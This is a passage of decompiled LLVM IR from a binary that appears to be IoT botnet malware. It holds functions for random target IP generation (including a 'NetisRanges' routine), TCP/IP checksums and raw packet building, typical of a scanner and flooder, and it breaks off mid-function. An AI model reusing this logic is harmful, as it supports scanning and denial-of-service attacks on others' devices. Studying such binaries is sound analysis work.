  %v8_c280 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b934.290 to i32), i32 %v4_c280, i32 %v6_c280, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c284

dec_label_pc_c284:                                ; preds = %dec_label_pc_c250, %dec_label_pc_c25c
  %v7_c288 = icmp eq i32 %v2_ab54, 105
  br i1 %v7_c288, label %dec_label_pc_c290, label %dec_label_pc_c2b8

dec_label_pc_c290:                                ; preds = %dec_label_pc_c284
  %v3_c29c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c2a8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c2b4 = sext i8 %v3_c29c to i32
  %v6_c2b4 = sext i8 %v3_c2a8 to i32
  %v8_c2b4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b944.292 to i32), i32 %v4_c2b4, i32 %v6_c2b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2b8

dec_label_pc_c2b8:                                ; preds = %dec_label_pc_c284, %dec_label_pc_c290
  %v7_c2bc = icmp eq i32 %v2_ab54, 106
  br i1 %v7_c2bc, label %dec_label_pc_c2c4, label %dec_label_pc_c2ec

dec_label_pc_c2c4:                                ; preds = %dec_label_pc_c2b8
  %v3_c2d0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c2dc = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c2e8 = sext i8 %v3_c2d0 to i32
  %v6_c2e8 = sext i8 %v3_c2dc to i32
  %v8_c2e8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b954.294 to i32), i32 %v4_c2e8, i32 %v6_c2e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2ec

dec_label_pc_c2ec:                                ; preds = %dec_label_pc_c2b8, %dec_label_pc_c2c4
  %v7_c2f0 = icmp eq i32 %v2_ab54, 107
  br i1 %v7_c2f0, label %dec_label_pc_c2f8, label %dec_label_pc_c320

dec_label_pc_c2f8:                                ; preds = %dec_label_pc_c2ec
  %v3_c304 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c310 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c31c = sext i8 %v3_c304 to i32
  %v6_c31c = sext i8 %v3_c310 to i32
  %v8_c31c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b960.296 to i32), i32 %v4_c31c, i32 %v6_c31c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %dec_label_pc_c2ec, %dec_label_pc_c2f8
  %v7_c324 = icmp eq i32 %v2_ab54, 108
  br i1 %v7_c324, label %dec_label_pc_c32c, label %dec_label_pc_c354

dec_label_pc_c32c:                                ; preds = %dec_label_pc_c320
  %v3_c338 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c344 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c350 = sext i8 %v3_c338 to i32
  %v6_c350 = sext i8 %v3_c344 to i32
  %v8_c350 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b970.298 to i32), i32 %v4_c350, i32 %v6_c350, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c354

dec_label_pc_c354:                                ; preds = %dec_label_pc_c320, %dec_label_pc_c32c
  %v7_c358 = icmp eq i32 %v2_ab54, 109
  br i1 %v7_c358, label %dec_label_pc_c360, label %dec_label_pc_c388

dec_label_pc_c360:                                ; preds = %dec_label_pc_c354
  %v3_c36c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c378 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c384 = sext i8 %v3_c36c to i32
  %v6_c384 = sext i8 %v3_c378 to i32
  %v8_c384 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b980.300 to i32), i32 %v4_c384, i32 %v6_c384, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c388

dec_label_pc_c388:                                ; preds = %dec_label_pc_c354, %dec_label_pc_c360
  %v7_c38c = icmp eq i32 %v2_ab54, 110
  br i1 %v7_c38c, label %dec_label_pc_c394, label %dec_label_pc_c3bc

dec_label_pc_c394:                                ; preds = %dec_label_pc_c388
  %v3_c3a0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c3ac = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c3b8 = sext i8 %v3_c3a0 to i32
  %v6_c3b8 = sext i8 %v3_c3ac to i32
  %v8_c3b8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b990.302 to i32), i32 %v4_c3b8, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3bc

dec_label_pc_c3bc:                                ; preds = %dec_label_pc_c388, %dec_label_pc_c394
  %v7_c3c0 = icmp eq i32 %v2_ab54, 111
  br i1 %v7_c3c0, label %dec_label_pc_c3c8, label %dec_label_pc_c3f0

dec_label_pc_c3c8:                                ; preds = %dec_label_pc_c3bc
  %v3_c3d4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c3e0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c3ec = sext i8 %v3_c3d4 to i32
  %v6_c3ec = sext i8 %v3_c3e0 to i32
  %v8_c3ec = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b9a0.304 to i32), i32 %v4_c3ec, i32 %v6_c3ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3f0

dec_label_pc_c3f0:                                ; preds = %dec_label_pc_c3bc, %dec_label_pc_c3c8
  %v7_c3f4 = icmp eq i32 %v2_ab54, 112
  br i1 %v7_c3f4, label %dec_label_pc_c3fc, label %dec_label_pc_c424

dec_label_pc_c3fc:                                ; preds = %dec_label_pc_c3f0
  %v3_c408 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c414 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c420 = sext i8 %v3_c408 to i32
  %v6_c420 = sext i8 %v3_c414 to i32
  %v8_c420 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b9b0.306 to i32), i32 %v4_c420, i32 %v6_c420, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c424

dec_label_pc_c424:                                ; preds = %dec_label_pc_c3f0, %dec_label_pc_c3fc
  %v7_c428 = icmp eq i32 %v2_ab54, 113
  br i1 %v7_c428, label %dec_label_pc_c430, label %dec_label_pc_c458

dec_label_pc_c430:                                ; preds = %dec_label_pc_c424
  %v3_c43c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c448 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c454 = sext i8 %v3_c43c to i32
  %v6_c454 = sext i8 %v3_c448 to i32
  %v8_c454 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b9c0.308 to i32), i32 %v4_c454, i32 %v6_c454, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c458

dec_label_pc_c458:                                ; preds = %dec_label_pc_c424, %dec_label_pc_c430
  %v7_c45c = icmp eq i32 %v2_ab54, 114
  br i1 %v7_c45c, label %dec_label_pc_c464, label %dec_label_pc_c48c

dec_label_pc_c464:                                ; preds = %dec_label_pc_c458
  %v3_c470 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_c47c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_c488 = sext i8 %v3_c470 to i32
  %v6_c488 = sext i8 %v3_c47c to i32
  %v8_c488 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b9d0.310 to i32), i32 %v4_c488, i32 %v6_c488, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c48c

dec_label_pc_c48c:                                ; preds = %dec_label_pc_c458, %dec_label_pc_c464
  store i32 %v2_aa80, i32* @r0, align 4
  %v1_c4c8 = call i32 @inet_addr(i32 %v2_aa80)
  store i32 %v3_aa78, i32* @fp, align 4
  ret i32 %v1_c4c8

; uselistorder directives
  uselistorder i32 %v2_aa80, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b550.160 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b35c.88 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b34c.86 to i32), { 1, 0 }
  uselistorder i8* @global_var_2d61e.84, { 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c48c, { 1, 0 }
  uselistorder label %dec_label_pc_c458, { 1, 0 }
  uselistorder label %dec_label_pc_c424, { 1, 0 }
  uselistorder label %dec_label_pc_c3f0, { 1, 0 }
  uselistorder label %dec_label_pc_c3bc, { 1, 0 }
  uselistorder label %dec_label_pc_c388, { 1, 0 }
  uselistorder label %dec_label_pc_c354, { 1, 0 }
  uselistorder label %dec_label_pc_c320, { 1, 0 }
  uselistorder label %dec_label_pc_c2ec, { 1, 0 }
  uselistorder label %dec_label_pc_c2b8, { 1, 0 }
  uselistorder label %dec_label_pc_c284, { 1, 0 }
  uselistorder label %dec_label_pc_c250, { 1, 0 }
  uselistorder label %dec_label_pc_c21c, { 1, 0 }
  uselistorder label %dec_label_pc_c1e8, { 1, 0 }
  uselistorder label %dec_label_pc_c1b4, { 1, 0 }
  uselistorder label %dec_label_pc_c180, { 1, 0 }
  uselistorder label %dec_label_pc_c14c, { 1, 0 }
  uselistorder label %dec_label_pc_c118, { 1, 0 }
  uselistorder label %dec_label_pc_c0e4, { 1, 0 }
  uselistorder label %dec_label_pc_c0b0, { 1, 0 }
  uselistorder label %dec_label_pc_c07c, { 1, 0 }
  uselistorder label %dec_label_pc_c048, { 1, 0 }
  uselistorder label %dec_label_pc_c014, { 1, 0 }
  uselistorder label %dec_label_pc_bfe0, { 1, 0 }
  uselistorder label %dec_label_pc_bfac, { 1, 0 }
  uselistorder label %dec_label_pc_bf78, { 1, 0 }
  uselistorder label %dec_label_pc_bf44, { 1, 0 }
  uselistorder label %dec_label_pc_bf10, { 1, 0 }
  uselistorder label %dec_label_pc_bedc, { 1, 0 }
  uselistorder label %dec_label_pc_bea8, { 1, 0 }
  uselistorder label %dec_label_pc_be74, { 1, 0 }
  uselistorder label %dec_label_pc_be40, { 1, 0 }
  uselistorder label %dec_label_pc_be0c, { 1, 0 }
  uselistorder label %dec_label_pc_bdd8, { 1, 0 }
  uselistorder label %dec_label_pc_bda4, { 1, 0 }
  uselistorder label %dec_label_pc_bd70, { 1, 0 }
  uselistorder label %dec_label_pc_bd3c, { 1, 0 }
  uselistorder label %dec_label_pc_bd08, { 1, 0 }
  uselistorder label %dec_label_pc_bcd4, { 1, 0 }
  uselistorder label %dec_label_pc_bca0, { 1, 0 }
  uselistorder label %dec_label_pc_bc6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc38, { 1, 0 }
  uselistorder label %dec_label_pc_ba34, { 1, 0 }
  uselistorder label %dec_label_pc_ba00, { 1, 0 }
  uselistorder label %dec_label_pc_b9cc, { 1, 0 }
  uselistorder label %dec_label_pc_b998, { 1, 0 }
  uselistorder label %dec_label_pc_b964, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0 }
  uselistorder label %dec_label_pc_b8fc, { 1, 0 }
  uselistorder label %dec_label_pc_b8c8, { 1, 0 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b860, { 1, 0 }
  uselistorder label %dec_label_pc_b82c, { 1, 0 }
  uselistorder label %dec_label_pc_b7f8, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %dec_label_pc_b75c, { 1, 0 }
  uselistorder label %dec_label_pc_b728, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
  uselistorder label %dec_label_pc_b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %dec_label_pc_b658, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 1, 0 }
  uselistorder label %dec_label_pc_b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 1, 0 }
  uselistorder label %dec_label_pc_b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 1, 0 }
  uselistorder label %dec_label_pc_b450, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b3e8, { 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b380, { 1, 0 }
  uselistorder label %dec_label_pc_b34c, { 1, 0 }
  uselistorder label %dec_label_pc_b318, { 1, 0 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b178, { 1, 0 }
  uselistorder label %dec_label_pc_b144, { 1, 0 }
  uselistorder label %dec_label_pc_b110, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0a8, { 1, 0 }
  uselistorder label %dec_label_pc_b074, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
  uselistorder label %dec_label_pc_b00c, { 1, 0 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af3c, { 1, 0 }
  uselistorder label %dec_label_pc_af08, { 1, 0 }
  uselistorder label %dec_label_pc_aed4, { 1, 0 }
  uselistorder label %dec_label_pc_aea0, { 1, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_ae38, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_ad9c, { 1, 0 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
  uselistorder label %dec_label_pc_ad34, { 1, 0 }
  uselistorder label %dec_label_pc_ad00, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
  uselistorder label %dec_label_pc_ac30, { 1, 0 }
  uselistorder label %dec_label_pc_abfc, { 1, 0 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_ab94, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_c4e0 = load i32, i32* @r4, align 4
  store i32 50408, i32* %stack_var_-4, align 4
  %v2_c4e4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c4e4, i32* @fp, align 4
  %v0_c4ec = call i32 @random()
  %v1_c4f4 = urem i32 %v0_c4ec, 16
  %v4_c504 = mul nuw nsw i32 %v1_c4f4, 4
  %v5_c504 = add i32 %v4_c504, ptrtoint (i32* @global_var_2d23c.312 to i32)
  %v6_c504 = inttoptr i32 %v5_c504 to i32*
  %v7_c504 = load i32, i32* %v6_c504, align 4
  %v1_c510 = trunc i32 %v7_c504 to i8
  store i8 %v1_c510, i8* bitcast (i8** @global_var_2d61a.80 to i8*), align 4
  %v0_c514 = call i32 @random()
  %v2_c524 = srem i32 %v0_c514, 255
  %v1_c534 = trunc i32 %v2_c524 to i8
  store i8 %v1_c534, i8* @global_var_2d61b.81, align 1
  %v0_c538 = call i32 @random()
  %v2_c548 = srem i32 %v0_c538, 255
  %v1_c558 = trunc i32 %v2_c548 to i8
  store i8 %v1_c558, i8* @global_var_2d61c.82, align 1
  %v0_c55c = call i32 @random()
  %v2_c56c = srem i32 %v0_c55c, 255
  %v1_c57c = trunc i32 %v2_c56c to i8
  store i8 %v1_c57c, i8* @global_var_2d61d.83, align 1
  %v2_c580 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v2_c5bc = load i8, i8* bitcast (i8** @global_var_2d61a.80 to i8*), align 4
  %v3_c5bc = zext i8 %v2_c5bc to i32
  %v3_c5c8 = load i8, i8* @global_var_2d61b.81, align 1
  %v4_c5c8 = zext i8 %v3_c5c8 to i32
  store i32 %v4_c5c8, i32* @r4, align 4
  %v3_c5d4 = load i8, i8* @global_var_2d61c.82, align 1
  %v6_c5fc = sext i8 %v3_c5c8 to i32
  %v8_c5fc = sext i8 %v3_c5d4 to i32
  %v9_c5fc = call i32 @szprintf(i32 %v2_c580, i32 ptrtoint ([12 x i8]* @global_var_1b9e0.315 to i32), i32 %v3_c5bc, i32 %v6_c5fc, i32 %v8_c5fc)
  store i32 %v2_c580, i32* @r0, align 4
  %v1_c608 = call i32 @inet_addr(i32 %v2_c580)
  store i32 %v3_c4e0, i32* @r4, align 4
  ret i32 %v1_c608

; uselistorder directives
  uselistorder i32 %v2_c580, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2d61d.83, { 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2d61c.82, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_2d61b.81, { 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2d61a.80 to i8*), { 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_c62c = load i32, i32* @fp, align 4
  %v2_c640 = load i32, i32* @global_var_33880.317, align 4
  %v1_c648 = call i32 @ntohl(i32 %v2_c640)
  %v2_c654 = and i32 %v1_c648, %arg1
  %v0_c65c = call i32 @rand_cmwc()
  %v1_c668 = sub i32 -1, %arg1
  %v2_c66c = and i32 %v0_c65c, %v1_c668
  %v2_c674 = xor i32 %v2_c66c, %v2_c654
  store i32 %v3_c62c, i32* @fp, align 4
  ret i32 %v2_c674

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_c7049 = icmp sgt i32 %arg2, 1
  br i1 %v8_c7049, label %dec_label_pc_c6b4, label %dec_label_pc_c708

dec_label_pc_c6b4:                                ; preds = %entry, %dec_label_pc_c6b4
  %v2_c6d0 = phi i32 [ %v2_c6d4, %dec_label_pc_c6b4 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_c6d8, %dec_label_pc_c6b4 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_c6f4, %dec_label_pc_c6b4 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_c6ec, %dec_label_pc_c6b4 ], [ %arg1, %entry ]
  %v4_c6b4 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_c6b8 = load i8, i8* %stack_var_-32.010, align 1
  %v3_c6b8 = zext i8 %v2_c6b8 to i32
  %v1_c6bc = add i32 %v4_c6b4, 1
  %v2_c6bc = inttoptr i32 %v1_c6bc to i8*
  %v3_c6bc = load i8, i8* %v2_c6bc, align 1
  %v4_c6bc = zext i8 %v3_c6bc to i32
  %v4_c6c0 = mul nuw nsw i32 %v4_c6bc, 256
  %v5_c6c0 = or i32 %v4_c6c0, %v3_c6b8
  %v2_c6d4 = add i32 %v5_c6c0, %v2_c6d0
  %v3_c6d4 = icmp ult i32 %v2_c6d4, %v2_c6d0
  %v4_c6d8 = zext i1 %v3_c6d4 to i32
  %v5_c6d8 = add i32 %v4_c6d8, %stack_var_-40.012
  %v1_c6e8 = add i32 %v4_c6b4, 2
  %v5_c6ec = inttoptr i32 %v1_c6e8 to i8*
  %v1_c6f4 = add nsw i32 %stack_var_-36.011, -2
  %v8_c704 = icmp sgt i32 %v1_c6f4, 1
  br i1 %v8_c704, label %dec_label_pc_c6b4, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c6b4, %entry
  %v2_c728 = phi i32 [ 0, %entry ], [ %v2_c6d4, %dec_label_pc_c6b4 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_c6ec, %dec_label_pc_c6b4 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_c6d8, %dec_label_pc_c6b4 ]
  %v7_c700.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_c6f4, %dec_label_pc_c6b4 ]
  %v7_c700.lcssa = icmp eq i32 %v7_c700.lcssa.in, 1
  br i1 %v7_c700.lcssa, label %dec_label_pc_c714, label %dec_label_pc_c790.preheader

dec_label_pc_c714:                                ; preds = %dec_label_pc_c708
  %v2_c718 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_c718 = zext i8 %v2_c718 to i32
  %v2_c72c = add i32 %v3_c718, %v2_c728
  %v3_c72c = icmp ult i32 %v2_c72c, %v2_c728
  %v4_c730 = zext i1 %v3_c72c to i32
  %v5_c730 = add i32 %v4_c730, %stack_var_-40.0.lcssa
  br label %dec_label_pc_c790.preheader

dec_label_pc_c790.preheader:                      ; preds = %dec_label_pc_c714, %dec_label_pc_c708
  %v3_c7bc.ph = phi i32 [ %v2_c728, %dec_label_pc_c708 ], [ %v2_c72c, %dec_label_pc_c714 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_c708 ], [ %v5_c730, %dec_label_pc_c714 ]
  %v3_c79436 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_c79c37 = udiv i32 %v3_c7bc.ph, 65536
  %v2_c7a038 = or i32 %v3_c79436, %v3_c79c37
  %v3_c7a839 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_c7b040 = or i32 %v2_c7a038, %v3_c7a839
  %v2_c7b441 = icmp eq i32 %v2_c7b040, 0
  br i1 %v2_c7b441, label %dec_label_pc_c7bc, label %dec_label_pc_c740

dec_label_pc_c740:                                ; preds = %dec_label_pc_c790.preheader, %dec_label_pc_c740
  %v3_c7a844 = phi i32 [ %v3_c7a8, %dec_label_pc_c740 ], [ %v3_c7a839, %dec_label_pc_c790.preheader ]
  %v2_c7a043 = phi i32 [ %v2_c7a0, %dec_label_pc_c740 ], [ %v2_c7a038, %dec_label_pc_c790.preheader ]
  %v3_c7bc42 = phi i32 [ %v2_c780, %dec_label_pc_c740 ], [ %v3_c7bc.ph, %dec_label_pc_c790.preheader ]
  %v2_c754 = urem i32 %v3_c7bc42, 65536
  %v2_c780 = add i32 %v2_c7a043, %v2_c754
  %v3_c780 = icmp ult i32 %v2_c780, %v2_c754
  %v4_c784 = zext i1 %v3_c780 to i32
  %v5_c784 = add nuw nsw i32 %v4_c784, %v3_c7a844
  %v3_c794 = mul i32 %v5_c784, 65536
  %v3_c79c = udiv i32 %v2_c780, 65536
  %v2_c7a0 = or i32 %v3_c794, %v3_c79c
  %v3_c7a8 = udiv i32 %v5_c784, 65536
  %v2_c7b0 = or i32 %v2_c7a0, %v3_c7a8
  %v2_c7b4 = icmp eq i32 %v2_c7b0, 0
  br i1 %v2_c7b4, label %dec_label_pc_c790.dec_label_pc_c7bc_crit_edge, label %dec_label_pc_c740

dec_label_pc_c790.dec_label_pc_c7bc_crit_edge:    ; preds = %dec_label_pc_c740
  br label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c790.dec_label_pc_c7bc_crit_edge, %dec_label_pc_c790.preheader
  %v3_c7bc.lcssa = phi i32 [ %v2_c780, %dec_label_pc_c790.dec_label_pc_c7bc_crit_edge ], [ %v3_c7bc.ph, %dec_label_pc_c790.preheader ]
  %v1_c7c8 = urem i32 %v3_c7bc.lcssa, 65536
  %v3_c7d0 = xor i32 %v1_c7c8, 65535
  ret i32 %v3_c7d0

; uselistorder directives
  uselistorder i32 %v2_c7a0, { 1, 0 }
  uselistorder i32 %v5_c784, { 1, 0 }
  uselistorder i32 %v2_c780, { 2, 0, 3, 1 }
  uselistorder i32 %v3_c7a839, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_c7bc.ph, { 2, 1, 0 }
  uselistorder i32 %v2_c728, { 0, 2, 1 }
  uselistorder i32 %v1_c6f4, { 0, 2, 1 }
  uselistorder i32 %v2_c6d4, { 0, 2, 1 }
  uselistorder i32 %v2_c6d0, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c740, { 1, 0 }
  uselistorder label %dec_label_pc_c6b4, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_c7e4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_c81c = add i32 %arg1, 12
  %v2_c81c = inttoptr i32 %v1_c81c to i32*
  %v3_c81c = load i32, i32* %v2_c81c, align 4
  store i32 %v3_c81c, i32* %stack_var_-44, align 4
  %v1_c844 = call i32 @htons(i32 20)
  %v1_c868 = call i32 @malloc(i32 32)
  %v2_c878 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_c868, i32* @r0, align 4
  store i32 %v2_c878, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_c88c = call i32 @memcpy()
  %v1_c894 = add i32 %v1_c868, 12
  %v3_c898 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_c894, i32* @r0, align 4
  store i32 %v3_c898, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_c8ac = call i32 @memcpy()
  %v2_c8b8 = inttoptr i32 %v1_c868 to i8*
  %v3_c8b8 = call i32 @csum(i8* %v2_c8b8, i32 32)
  %sext2 = mul i32 %v3_c8b8, 16777216
  %v3_c8c4 = ashr i32 %sext2, 31
  store i32 %v1_c868, i32* @r0, align 4
  %v0_c8d0 = call i32 @free()
  %v3_c8d8 = sdiv i32 %sext2, 16777216
  %v4_c8dc = mul nsw i32 %v3_c8c4, 256
  %v4_c8e0 = and i32 %v4_c8dc, 65280
  %v5_c8e0 = or i32 %v4_c8e0, %v3_c8d8
  store i32 %v3_c7e4, i32* @fp, align 4
  ret i32 %v5_c8e0

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_c868, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
